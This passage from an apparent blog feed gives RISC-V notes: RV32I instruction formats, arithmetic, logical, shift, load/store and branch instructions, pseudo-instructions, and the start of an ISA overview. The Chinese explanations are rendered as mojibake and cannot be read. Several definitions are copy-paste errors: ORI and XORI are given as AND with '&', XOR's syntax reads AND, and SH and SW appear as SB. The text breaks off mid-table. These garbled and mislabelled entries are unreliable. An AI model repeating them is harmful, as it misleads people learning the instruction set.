        <content type="html"><![CDATA[<h1 id="RISC-V-ASM"><a href="#RISC-V-ASM" class="headerlink" title="RISC-V ASM"></a>RISC-V ASM</h1><p>ä¸»è¦æ˜¯RV32Içš„asm</p><h2 id="operation"><a href="#operation" class="headerlink" title="operation"></a>operation</h2><p>instruction(æŒ‡ä»¤):ç›´æ¥å¯¹åº”äºŒè¿›åˆ¶æœºå™¨æŒ‡ä»¤çš„å­—ç¬¦ä¸²</p><p>pseudo-instruction(ä¼ªæŒ‡ä»¤):ä¸€æ¡ä¼ªæŒ‡ä»¤æŒ‡ç¤ºæ±‡ç¼–å™¨äº§ç”Ÿå¤šæ¡å®é™…çš„æŒ‡ä»¤(instruction)</p><p>direction(æŒ‡ç¤º&#x2F;ä¼ªæ“ä½œ):é€šè¿‡ç±»ä¼¼æŒ‡ä»¤çš„å½¢å¼(ä»¥â€œ.â€å¼€å¤´)ï¼Œé€šçŸ¥æ±‡ç¼–å™¨å¦‚ä½•æ§åˆ¶ä»£ç çš„äº§ç”Ÿç­‰ï¼Œä¸å¯¹åº”å…·ä½“çš„æŒ‡ä»¤ï¼Œæ¯”å¦‚.textæ˜¯å‘Šè¯‰æ±‡ç¼–å™¨æ”¾åˆ°.textèŠ‚é‡Œ,</p><p>macroï¼šé‡‡ç”¨ .macro&#x2F;.endm è‡ªå®šä¹‰çš„å®</p><h2 id="æŒ‡ä»¤ç¼–ç æ ¼å¼"><a href="#æŒ‡ä»¤ç¼–ç æ ¼å¼" class="headerlink" title="æŒ‡ä»¤ç¼–ç æ ¼å¼"></a>æŒ‡ä»¤ç¼–ç æ ¼å¼</h2><p><img src="/2023/07/09/risc-v-asm/image-20230710232853854.png" alt="image-20230710232853854"></p><p><strong>funct3å’Œfunct7å’Œopcodeå†³å®šæŒ‡ä»¤ç±»å‹</strong>(åŠ å‡ä¹˜é™¤ç­‰ç­‰)</p><blockquote><p>funct3:functä»£è¡¨function 3ä»£è¡¨å äº†3bits</p></blockquote><ul><li>R-type:ï¼ˆRegisterï¼‰ï¼Œæ¯æ¡æŒ‡ä»¤ä¸­æœ‰ä¸‰ä¸ª fieldsï¼Œç”¨äºæŒ‡å®š3ä¸ªå¯„å­˜å™¨å‚æ•°</li><li>I-type: (Immediateï¼‰ï¼Œæ¯æ¡æŒ‡ä»¤é™¤äº†å¸¦æœ‰ä¸¤ä¸ªå¯„å­˜å™¨å‚æ•°å¤–ï¼Œè¿˜å¸¦æœ‰ä¸€ä¸ªç«‹å³æ•°å‚æ•°ï¼ˆå®½åº¦ä¸º 12 bitsï¼‰ã€‚</li><li>S-type: ï¼ˆStoreï¼‰ï¼Œæ¯æ¡æŒ‡ä»¤é™¤äº†å¸¦æœ‰ä¸¤ä¸ªå¯„å­˜å™¨å‚æ•°å¤–ï¼Œè¿˜å¸¦æœ‰ä¸€ä¸ªç«‹å³æ•°å‚æ•°ï¼ˆå®½åº¦ä¸º 12 bitsï¼Œä½† fields çš„ç»„ç»‡æ–¹å¼ä¸åŒäº I-typeï¼‰</li><li>B-type: (Branch)ï¼Œæ¯æ¡æŒ‡ä»¤é™¤äº†å¸¦æœ‰ä¸¤ä¸ªå¯„å­˜å™¨å‚æ•°å¤–ï¼Œè¿˜å¸¦æœ‰ä¸€ä¸ªç«‹å³æ•°å‚æ•°ï¼ˆå®½åº¦ä¸º 12 bitsï¼Œä½†å–å€¼ä¸º 2 çš„å€æ•°ï¼‰ã€‚</li><li>U-type: ï¼ˆUpperï¼‰ï¼Œæ¯æ¡æŒ‡ä»¤å«æœ‰ä¸€ä¸ªå¯„å­˜å™¨å‚æ•°å†åŠ ä¸Šä¸€ä¸ªç«‹å³æ•°å‚æ•°ï¼ˆå®½åº¦ä¸º 20bitsï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªç«‹å³æ•°çš„é«˜ 20 ä½ï¼‰</li><li>J-type: ï¼ˆJumpï¼‰ï¼Œæ¯æ¡æŒ‡ä»¤å«æœ‰ä¸€ä¸ªå¯„å­˜å™¨å‚æ•°å†åŠ ä¸Šä¸€ä¸ªç«‹å³æ•°å‚æ•°ï¼ˆå®½åº¦ä¸º 20bitsï¼‰</li></ul><blockquote><p>rd:rä»£è¡¨register dä»£è¡¨destination</p><p>rs:sä»£è¡¨source</p></blockquote><h2 id="ç®—æ³•è¿ç®—æŒ‡ä»¤"><a href="#ç®—æ³•è¿ç®—æŒ‡ä»¤" class="headerlink" title="ç®—æ³•è¿ç®—æŒ‡ä»¤"></a>ç®—æ³•è¿ç®—æŒ‡ä»¤</h2><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>ADD RD(5)ï¼ŒRS1(5)ï¼ŒRS2(5)    RD&#x3D;RS1+RS2</p><blockquote><p>5è¡¨ç¤ºå 5ä¸ªbit</p></blockquote><p>ç¼–ç æ ¼å¼:R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721154322672.png" alt="image-20230721154322672"></p><ul><li>opcode:01 100 11</li><li>fuct3:000 funct7 0000000</li></ul><h3 id="SUB"><a href="#SUB" class="headerlink" title="SUB"></a>SUB</h3><p>SUB RD, RS1, RS2RD&#x3D;RS1-RS2</p><p>ç¼–ç æ ¼å¼:R-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721154425111.png" alt="image-20230721154425111"></p><ul><li>opcode:01 100 11</li><li>fuct3:000 funct7 0100000</li></ul><h3 id="ADDIï¼ˆADD-Immediateï¼‰"><a href="#ADDIï¼ˆADD-Immediateï¼‰" class="headerlink" title="ADDIï¼ˆADD Immediateï¼‰"></a>ADDIï¼ˆADD Immediateï¼‰</h3><p>ADDI RD, RS1, IMMRD&#x3D;RSI+IMM</p><p>ç¼–ç æ ¼å¼ï¼šI-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721155114720.png" alt="image-20230721155114720"></p><p>ç«‹å³æ•°åªèƒ½è¡¨æ˜¯-2<sup>11</sup><del>2<sup>11</sup>-1 (-2048</del>2047)ç«‹å³æ•°å‚ä¸è¿ç®—å‰ä¼šè¢«åšç¬¦å·æ‹“å±•ä½32ä½imm</p><h3 id="LUI-Loda-Upper-Immediate"><a href="#LUI-Loda-Upper-Immediate" class="headerlink" title="LUI(Loda Upper Immediate)"></a>LUI(Loda Upper Immediate)</h3><p>LUI RD,IMMRD&#x3D;IMM&lt;&lt;12</p><p>ç¼–ç æ ¼å¼ï¼šU-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721163824345.png" alt="image-20230721163824345"></p><p>å’ŒADDIæŒ‡ä»¤é…åˆä½¿ç”¨æ¥ç»™å¯„å­˜å™¨èµ‹å€¼å¤§ç«‹å³æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lui x1,0x12345</span><br><span class="line">addi x1,0x678 ;    x1=0x12345678</span><br></pre></td></tr></table></figure><p>å¯¹äºä½12ä½çš„ç¬¦å·ä½æ˜¯1çš„æƒ…å†µï¼Œç”±äºaddiæœ‰ç¬¦å·æ‹“å±•ï¼Œå°±éœ€è¦ç”¨å‡æ³•æ¥å®ç°</p><p>æ¯”å¦‚æƒ³è®©x1&#x3D;0x12345fff</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lui x1,0x12346</span><br><span class="line">addi x1,-1</span><br></pre></td></tr></table></figure><h3 id="LI-Load-Immediate"><a href="#LI-Load-Immediate" class="headerlink" title="LI(Load Immediate)"></a>LI(Load Immediate)</h3><p>LI RD,IMMRD&#x3D;IMM</p><p><strong>ä¼ªæŒ‡ä»¤ å¯ä»¥ç»™æŸä¸ªå¯„å­˜å™¨èµ‹32ä½çš„å€¼ï¼Œå°±ä¸éœ€è¦æˆ‘ä»¬è‡ªå·±ç”¨luiå’ŒaddiæŒ‡ä»¤æ¥åšï¼Œè€Œæ˜¯ç”±æ±‡ç¼–å™¨æ¥å®Œæˆ</strong></p><h3 id="AUIPC"><a href="#AUIPC" class="headerlink" title="AUIPC"></a>AUIPC</h3><p>AUIPC RD IMMRD&#x3D;IMM&lt;&lt;12+PC</p><p>ç¼–ç æ ¼å¼ï¼šU-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721171932394.png" alt="image-20230721171932394"></p><h3 id="LA-Load-Address"><a href="#LA-Load-Address" class="headerlink" title="LA(Load Address)"></a>LA(Load Address)</h3><p>LA RD,LABEL åŠ è½½ä¸€ä¸ªå‡½æ•°æˆ–å˜é‡çš„åœ°å€</p><p><strong>ä¼ªæŒ‡ä»¤ æ±‡ç¼–å™¨ä¼šåˆ©ç”¨auipcæŒ‡ä»¤å’Œå…¶ä»–æŒ‡ä»¤æ¥ç”Ÿæˆ</strong></p><h3 id="NEG"><a href="#NEG" class="headerlink" title="NEG"></a>NEG</h3><p>NEG RDï¼ŒRSRD&#x3D;-RS</p><p><strong>ä¼ªæŒ‡ä»¤ å®é™…æ˜¯SUB RDï¼Œx0ï¼ŒRS</strong>(é›¶å¯„å­˜å™¨x0)</p><h3 id="MV"><a href="#MV" class="headerlink" title="MV"></a>MV</h3><p>MV RDï¼ŒRSRD&#x3D;RS</p><p><strong>ä¼ªæŒ‡ä»¤ å®é™…ä¸Šæ˜¯ADDI RDï¼ŒRSï¼Œ0</strong></p><h3 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a>NOP</h3><p>å°±æ˜¯nopå•¦hh</p><p><strong>ä¼ªæŒ‡ä»¤ å®é™…ä¸Šæ˜¯ADDI x0,x0,0</strong> </p><h2 id="é€»è¾‘è¿ç®—æŒ‡ä»¤"><a href="#é€»è¾‘è¿ç®—æŒ‡ä»¤" class="headerlink" title="é€»è¾‘è¿ç®—æŒ‡ä»¤"></a>é€»è¾‘è¿ç®—æŒ‡ä»¤</h2><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>AND RD,RS1,RS2RD &#x3D; RS1 &amp; RS2</p><p>ç¼–ç æ ¼å¼ï¼šR-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721173921186.png" alt="image-20230721173921186"></p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>OR RD,RS1,RS2RD &#x3D; RS1 | RS2</p><p>ç¼–ç æ ¼å¼ï¼šR-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174008445.png" alt="image-20230721174008445"></p><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>AND RD,RS1,RS2RD &#x3D; RS1 ^ RS2</p><p>ç¼–ç æ ¼å¼ï¼šR-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174111167.png" alt="image-20230721174111167"></p><h3 id="ANDI"><a href="#ANDI" class="headerlink" title="ANDI"></a>ANDI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>ç¼–ç æ ¼å¼ï¼šI-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174041635.png" alt="image-20230721174041635"></p><h3 id="ORI"><a href="#ORI" class="headerlink" title="ORI"></a>ORI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>ç¼–ç æ ¼å¼ï¼šI-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174138698.png" alt="image-20230721174138698"></p><h3 id="XORI"><a href="#XORI" class="headerlink" title="XORI"></a>XORI</h3><p>AND RD,RS1,IMMRD &#x3D; RS1 &amp; IMM</p><p>ç¼–ç æ ¼å¼ï¼šI-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721174152255.png" alt="image-20230721174152255"></p><h3 id="NOT"><a href="#NOT" class="headerlink" title="NOT"></a>NOT</h3><p>NOT RD,RS RD&#x3D;!RS é</p><p><strong>ä¼ªæŒ‡ä»¤ å®é™…ä¸Šæ˜¯XOR RDï¼ŒRSï¼Œ-1</strong></p><h2 id="ç§»ä½è¿ç®—æŒ‡ä»¤"><a href="#ç§»ä½è¿ç®—æŒ‡ä»¤" class="headerlink" title="ç§»ä½è¿ç®—æŒ‡ä»¤"></a>ç§»ä½è¿ç®—æŒ‡ä»¤</h2><h3 id="gt-gt-gt-é€»è¾‘ç§»ä½"><a href="#gt-gt-gt-é€»è¾‘ç§»ä½" class="headerlink" title="&gt;&gt;&gt;é€»è¾‘ç§»ä½"></a><strong>&gt;&gt;&gt;é€»è¾‘ç§»ä½</strong></h3><h3 id="SLL-Shitf-Left-Logical"><a href="#SLL-Shitf-Left-Logical" class="headerlink" title="SLL(Shitf Left Logical)"></a>SLL(Shitf Left Logical)</h3><p>SLL RD,RS1,RS2RD&#x3D;RS1&lt;&lt;RS2</p><p>ç¼–ç æ ¼å¼ï¼šR-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180716677.png" alt="image-20230721180716677"></p><h3 id="SRL-Shitf-Right-Logical"><a href="#SRL-Shitf-Right-Logical" class="headerlink" title="SRL(Shitf Right Logical)"></a>SRL(Shitf Right Logical)</h3><p>SRL RD,RS1,RS2RD&#x3D;RS1&gt;&gt;RS2</p><p>ç¼–ç æ ¼å¼ï¼šR-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180838972.png" alt="image-20230721180838972"></p><h3 id="SLLI-Shitf-Right-Logical-Immediate"><a href="#SLLI-Shitf-Right-Logical-Immediate" class="headerlink" title="SLLI(Shitf Right Logical Immediate)"></a>SLLI(Shitf Right Logical Immediate)</h3><p>SLLI RD,RS1,IMMRD&#x3D;RS1&lt;&lt;IMM</p><p>ç¼–ç æ ¼å¼ï¼šI-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180802935.png" alt="image-20230721180802935"></p><h3 id="SRLI-Shitf-Right-Logical-Immediate"><a href="#SRLI-Shitf-Right-Logical-Immediate" class="headerlink" title="SRLI(Shitf Right Logical Immediate)"></a>SRLI(Shitf Right Logical Immediate)</h3><p>SRLI RD,RS1,IMMRD&#x3D;RS1&gt;&gt;IMM</p><p>ç¼–ç æ ¼å¼ï¼šI-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721180904728.png" alt="image-20230721180904728"></p><h3 id="gt-gt-gt-ç®—æ•°ç§»ä½"><a href="#gt-gt-gt-ç®—æ•°ç§»ä½" class="headerlink" title="&gt;&gt;&gt;ç®—æ•°ç§»ä½"></a><strong>&gt;&gt;&gt;ç®—æ•°ç§»ä½</strong></h3><h3 id="SRA-Shitf-Right-Arithmetic"><a href="#SRA-Shitf-Right-Arithmetic" class="headerlink" title="SRA(Shitf Right Arithmetic)"></a>SRA(Shitf Right Arithmetic)</h3><p>SRA RD,RS1,RS2RD&#x3D;RS1&gt;&gt;RS2</p><p>ç¼–ç æ ¼å¼ï¼šR-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721181748545.png" alt="image-20230721181748545"></p><h3 id="SRAI"><a href="#SRAI" class="headerlink" title="SRAI"></a>SRAI</h3><p>SRA RD,RS1,IMMRD&#x3D;RS1&gt;&gt;IMM</p><p>ç¼–ç æ ¼å¼ï¼šI-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721181807571.png" alt="image-20230721181807571"></p><blockquote><p><strong>shamt(shift amount)æ„ä¸ºç§»åŠ¨é‡ï¼Œäº”ä¸ªbitæ¥æè¿°2^5 â€“ 1&#x3D;31å¯¹äºRV32å°±å¤Ÿäº†</strong></p></blockquote><h2 id="å†…å­˜è¯»å†™æŒ‡ä»¤load-store"><a href="#å†…å­˜è¯»å†™æŒ‡ä»¤load-store" class="headerlink" title="å†…å­˜è¯»å†™æŒ‡ä»¤load store"></a>å†…å­˜è¯»å†™æŒ‡ä»¤load store</h2><h3 id="LB-Load-Byte"><a href="#LB-Load-Byte" class="headerlink" title="LB(Load Byte)"></a>LB(Load Byte)</h3><p>LB RD,IMM(RS1)*(Byte*)(RD) &#x3D; *(Byte*)(RS1+IMM) è¯»å–çš„æ•°æ®åšç¬¦å·æ‹“å±•</p><h3 id="LH-Load-Halfword"><a href="#LH-Load-Halfword" class="headerlink" title="LH(Load Halfword)"></a>LH(Load Halfword)</h3><p>LH RD,IMM(RS1)*(Halfword*)(RD) &#x3D; *(Halfword*)(RS1+IMM) è¯»å–çš„ä¸¤å­—èŠ‚æ•°æ®åšç¬¦å·æ‹“å±•</p><h3 id="LW-Load-Word"><a href="#LW-Load-Word" class="headerlink" title="LW(Load Word)"></a>LW(Load Word)</h3><p>LW RD,IMM(RS1)*(Word*)(RD) &#x3D; *(Wword*)(RS1+IMM) å››å­—èŠ‚</p><h3 id="LBU-Load-Byte-Unsigned"><a href="#LBU-Load-Byte-Unsigned" class="headerlink" title="LBU(Load Byte Unsigned)"></a>LBU(Load Byte Unsigned)</h3><p>LBU RD,IMM(RS1)*(Byte*)(RD) &#x3D; *(Byte*)(RS1+IMM) è¯»å–çš„æ•°æ®åšé›¶æ‹“å±•</p><h3 id="LHU-Load-HalfWord-Unsigned"><a href="#LHU-Load-HalfWord-Unsigned" class="headerlink" title="LHU(Load HalfWord Unsigned)"></a>LHU(Load HalfWord Unsigned)</h3><p>LHU RD,IMM(RS1)*(Halfword*)(RD) &#x3D; *(Halfword*)(RS1+IMM) è¯»å–çš„æ•°æ®åšé›¶æ‹“å±•</p><p>ç¼–ç æ ¼å¼å‡ä¸ºI-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721182935536.png" alt="image-20230721182935536"></p><h3 id="SB-Store-Byte"><a href="#SB-Store-Byte" class="headerlink" title="SB(Store Byte)"></a>SB(Store Byte)</h3><p>SB RS2,IMM(RS1)*(Byte*)(RS1+IMM)&#x3D;RS2[0:7]</p><h3 id="SH-Stroe-Halfword"><a href="#SH-Stroe-Halfword" class="headerlink" title="SH(Stroe Halfword)"></a>SH(Stroe Halfword)</h3><p>SB RS2,IMM(RS1)*(Halfword*)(RS1+IMM)&#x3D;RS2[0:15]</p><h3 id="SW-Store-Word"><a href="#SW-Store-Word" class="headerlink" title="SW(Store Word)"></a>SW(Store Word)</h3><p>SB RS2,IMM(RS1)*(Word*)(RS1+IMM)&#x3D;RS2</p><p>ç¼–ç æ ¼å¼å‡ä¸ºS-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721185513346.png" alt="image-20230721185513346"></p><h2 id="æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤"><a href="#æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤" class="headerlink" title="æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤"></a>æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤</h2><p><img src="/2023/07/09/risc-v-asm/image-20230721190529161.png" alt="image-20230721190529161"></p><p><strong>è·³è½¬çš„ç›®æ ‡åœ°å€è®¡ç®—æ–¹æ³•ï¼šå…ˆå°† IMM x 2ï¼Œç¬¦å·æ‰©å±•åå’Œ PC å€¼ç›¸åŠ å¾—åˆ°æœ€ç»ˆçš„ç›®æ ‡åœ°å€ï¼Œæ‰€ä»¥è·³è½¬èŒƒå›´æ˜¯ä»¥ PC ä¸ºåŸºå‡†ï¼Œ+&#x2F;- 4KB å·¦å³ ([-4096, 4094])ã€‚</strong></p><blockquote><p><img src="/2023/07/09/risc-v-asm/image-20230721192040448.png" alt="image-20230721192040448"></p><p>b-typeé‡Œæ˜¯æ²¡æœ‰0ä½çš„åº”ä¸º0ä½æ°¸è¿œä¸º0ï¼Œ-4096, 4094æ˜¯å› ä¸º 2*(-2^(11),2^(11)-1)</p></blockquote><p><img src="/2023/07/09/risc-v-asm/image-20230721194722440.png" alt="image-20230721194722440"></p><h3 id="JAL-Jump-And-Link"><a href="#JAL-Jump-And-Link" class="headerlink" title="JAL(Jump And Link)"></a>JAL(Jump And Link)</h3><p>JAL RD,LABEL</p><p>ç¼–ç æ ¼å¼J-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721213626062.png" alt="image-20230721213626062"></p><p>è°ƒç”¨å­è¿‡ç¨‹ï¼ŒæŠŠ20ä½å®½çš„ç«‹å³æ•°<em>2åè¿›è¡Œç¬¦å·æ‹“å±•å’Œpcå€¼ç›¸åŠ ï¼Œç„¶åæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å†™å…¥RDï¼Œæ‰€ä»¥è·³è½¬èŒƒå›´åº”è¯¥æ˜¯2*(-2^(19),2^(19)-1)å³(-1048576ï¼Œ1048574)çº¦ç­‰äº</em><em>+&#x2F;-1M</em>*</p><h3 id="JALR-Jump-And-Link-Register"><a href="#JALR-Jump-And-Link-Register" class="headerlink" title="JALR(Jump And Link Register)"></a>JALR(Jump And Link Register)</h3><p>JALR RD,IMM(RS1)</p><p>ç¼–ç æ ¼å¼I-type</p><p><img src="/2023/07/09/risc-v-asm/image-20230721214742447.png" alt="image-20230721214742447"></p><p>è°ƒç”¨å­è¿‡ç¨‹ï¼ŒæŠŠ12bitçš„IMMè¿›è¡Œç¬¦å·æ‹“å±•åå’ŒRS1ç›¸åŠ ï¼Œå°†ç»“æœæœ€ä½1bitè®¾ç½®ä¸º0(ç¡®ä¿åœ°å€æŒ‰ç…§ä¸¤å­—èŠ‚å¯¹é½)ï¼Œè·³è½¬åœ°å€ä»¥RS1ä¸ºåŸºå‡†ï¼Œ-2^11,2^11-1ï¼Œä¸Šä¸‹**+&#x2F;-2k**</p><blockquote><p>å¯¹äºè¶…è¿‡1Mçš„è¿œè·ç¦»è·³è½¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auipc x6,IMM </span><br><span class="line">jalr x1,x6,IMM</span><br></pre></td></tr></table></figure></blockquote><h3 id="J"><a href="#J" class="headerlink" title="J"></a>J</h3><p>J offset ç›¸å½“äºx86çš„jmp</p><p><strong>ä¼ªæŒ‡ä»¤ ç›¸å½“äºJAL x0ï¼Œoffset</strong></p><h3 id="JR"><a href="#JR" class="headerlink" title="JR"></a>JR</h3><p>JR RS</p><p><strong>ä¼ªæŒ‡ä»¤ ç›¸å½“äºJALR x0ï¼Œ0(RS)</strong></p><h2 id="è°ƒç”¨çº¦å®š"><a href="#è°ƒç”¨çº¦å®š" class="headerlink" title="è°ƒç”¨çº¦å®š"></a>è°ƒç”¨çº¦å®š</h2><p><img src="/2023/07/09/risc-v-asm/image-20230721235450399.png" alt="image-20230721235450399"></p><h3 id="åŸºäºè°ƒç”¨çº¦å®šçš„ä¼ªæŒ‡ä»¤"><a href="#åŸºäºè°ƒç”¨çº¦å®šçš„ä¼ªæŒ‡ä»¤" class="headerlink" title="åŸºäºè°ƒç”¨çº¦å®šçš„ä¼ªæŒ‡ä»¤"></a>åŸºäºè°ƒç”¨çº¦å®šçš„ä¼ªæŒ‡ä»¤</h3><p><img src="/2023/07/09/risc-v-asm/image-20230722001809195.png" alt="image-20230722001809195"></p><p>TODO: emmï¼Œç¼–è¯‘32ä½riscvæ—¶ç¼ºå°‘å¤´æ–‡ä»¶äº†ï¼Œæš‚æ—¶æ²¡è§£å†³ï¼Œ64ä½åˆæœ‰ä¸€ç‚¹ç‚¹ä¸ä¸€æ ·ï¼Œæš‚æ—¶ä¸åšå®ä¾‹åˆ†æ</p>]]></content>
      
      
      
        <tags>
            
            <tag> RISC-V </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RISC-V ISAä»‹ç»</title>
      <link href="/2023/07/08/ISA-risc-v/"/>
      <url>/2023/07/08/ISA-risc-v/</url>
      
        <content type="html"><![CDATA[<h1 id="RISC-V-ISA"><a href="#RISC-V-ISA" class="headerlink" title="RISC-V ISA"></a>RISC-V ISA</h1><p>å¼€æº</p><h2 id="ISA-Instruction-Set-Architecture-æŒ‡ä»¤é›†æ¶æ„"><a href="#ISA-Instruction-Set-Architecture-æŒ‡ä»¤é›†æ¶æ„" class="headerlink" title="ISA(Instruction Set Architecture)æŒ‡ä»¤é›†æ¶æ„"></a>ISA(Instruction Set Architecture)æŒ‡ä»¤é›†æ¶æ„</h2><p>åº•å±‚ç¡¬ä»¶ç”µè·¯é¢å‘ä¸Šå±‚è½¯ä»¶ç¨‹åºæä¾›çš„ä¸€å±‚<strong>æ¥å£è§„èŒƒ</strong></p><blockquote><p>æ“ä½œç³»ç»Ÿæä¾›ç»™åº”ç”¨ç¨‹åºçš„æ¥å£å°±æ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œæ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ç›´æ¥å°±æ˜¯ISA ç¡¬ä»¶éƒ¨åˆ†çš„è¯ä¸šç•Œé‡Œä¸€èˆ¬å«<a href="https://zh.wikipedia.org/zh-cn/%E5%BE%AE%E6%9E%B6%E6%A7%8B">å¾®æ¶æ„</a>microarchitectureï¼Œæœ‰äº†ISAçš„æŠ½è±¡å±‚æˆ‘ä»¬åšåº•å±‚å¼€å‘å°±ä¸éœ€è¦å…³å¿ƒå¾®æ¶æ„å…·ä½“æ˜¯ä»€ä¹ˆæ ·çš„</p></blockquote><p>ä»–æ˜¯ä¸€å¥—æ ‡å‡†ï¼Œç±»ä¼¼cè¯­è¨€çš„æ ‡å‡†ï¼ŒPOSIXæ ‡å‡†ç­‰ç­‰ï¼Œå…·ä½“çš„å®ç°æœ‰å¾ˆå¤šç§ï¼Œä¸åŒçš„cpuå‚å®¶å®ç°æ˜¯ä¸ä¸€æ ·çš„ï¼Œå°±æ¯”å¦‚è¯´x86æ¶æ„çš„æ ‡å‡†å¯èƒ½ç”±intelå’Œamdç­‰å…¬å¸æ¥å®ç°</p><blockquote><p>å°æ•…äº‹ï¼šamd64æ¶æ„</p><p>å½“å¹´intelå…ˆæ¨å‡º64ä½æ¶æ„(IA-64)å¤„ç†å™¨ä½†æ˜¯ä»–ä¸å…¼å®¹32ä½æ¶æ„çš„æœºå™¨ï¼Œå¯¼è‡´èŠ¯ç‰‡æ»é”€ï¼Œamdåæ¨å‡º64ä½æŒ‡ä»¤é›†æ¶æ„amd64å…¼å®¹äº†ä¹‹å‰32ä½æŒ‡ä»¤é›†ï¼Œç•…é”€åï¼Œè½¯ä»¶ç”Ÿæ€ä¸Šå°±å é¢†äº†å…ˆæœºï¼Œintelåªèƒ½ç”¨amd64æ¶æ„(å¥½åƒæ˜¯ä¹°amd64çš„æˆæƒï¼Œ<del>æ¶‰åŠåˆ°æˆæƒå…³ç³»å°±æŒºæ··ä¹±äº†ã€‚ã€‚ã€‚</del>)ï¼Œintelåœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œäº†æ‰©å……,å«x86-64</p></blockquote><p>ISAå®šä¹‰äº†</p><ul><li>åŸºæœ¬æ•°æ®ç±»å‹</li><li>å¯„å­˜å™¨</li><li>æŒ‡ä»¤</li><li>å†…å­˜æ¨¡å‹</li><li>å¯»å€æ¨¡å¼</li><li>å¼‚å¸¸æˆ–ä¸­æ–­çš„å¤„ç†æ–¹å¼ç­‰ç­‰</li></ul><blockquote><p>ä¸€ä¸ªæ¯”è¾ƒé”™è¯¯çš„è®¤ä¸ºå°±æ˜¯<del>ISAå°±æ˜¯æ±‡ç¼–</del>ï¼Œæ±‡ç¼–æ˜¯ISAçš„ä¸€å°éƒ¨åˆ†</p></blockquote><h2 id="RISC-V-ISA-å‘½åæ ¼å¼"><a href="#RISC-V-ISA-å‘½åæ ¼å¼" class="headerlink" title="RISC-V ISA å‘½åæ ¼å¼"></a>RISC-V ISA å‘½åæ ¼å¼</h2><p><strong>RV[###][abcâ€¦..xyz]</strong></p><ul><li>RVï¼šç”¨äºæ ‡è¯† RISC-V ä½“ç³»æ¶æ„çš„å‰ç¼€ï¼Œå³ RISC-Vçš„ç¼©å†™ã€‚</li><li>[###]ï¼š{32, 64, 128} ç”¨äºæ ‡è¯†å¤„ç†å™¨çš„å­—å®½ï¼Œä¹Ÿå°±æ˜¯å¤„ç†å™¨çš„å¯„å­˜å™¨çš„å®½åº¦ï¼ˆå•ä½ä¸ºbitï¼‰</li><li>[abcâ€¦xyz]ï¼šæ ‡è¯†è¯¥å¤„ç†å™¨æ”¯æŒçš„æŒ‡ä»¤é›†æ¨¡å—é›†åˆ</li></ul><h2 id="æ¨¡å—åŒ–ISA"><a href="#æ¨¡å—åŒ–ISA" class="headerlink" title="æ¨¡å—åŒ–ISA"></a>æ¨¡å—åŒ–ISA</h2><p>ç”±1ä¸ªåŸºæœ¬æ•´æ•°æŒ‡ä»¤é›† + å¤šä¸ªå¯é€‰çš„æ‰©å±•æŒ‡ä»¤é›†ç»„æˆã€‚åŸºç¡€æŒ‡ä»¤é›†æ˜¯å›ºå®šçš„</p><p><del>WCï¼Œå¯å®šåˆ¶åŒ–èŠ¯ç‰‡</del></p><table><thead><tr><th>åŸºæœ¬æŒ‡ä»¤é›†</th><th>æè¿°</th></tr></thead><tbody><tr><td>RV32I</td><td>32ä½æ•´æ•°æŒ‡ä»¤é›†</td></tr><tr><td>RV32E</td><td>RV32I çš„å­é›†ï¼Œç”¨äºå°å‹çš„åµŒå…¥å¼åœºæ™¯</td></tr><tr><td>RV64I</td><td>64 ä½æ•´æ•°æŒ‡ä»¤é›†ï¼Œå…¼å®¹ RV32I</td></tr><tr><td>RV128I</td><td>128 ä½æ•´æ•°æŒ‡ä»¤é›†ï¼Œå…¼å®¹ 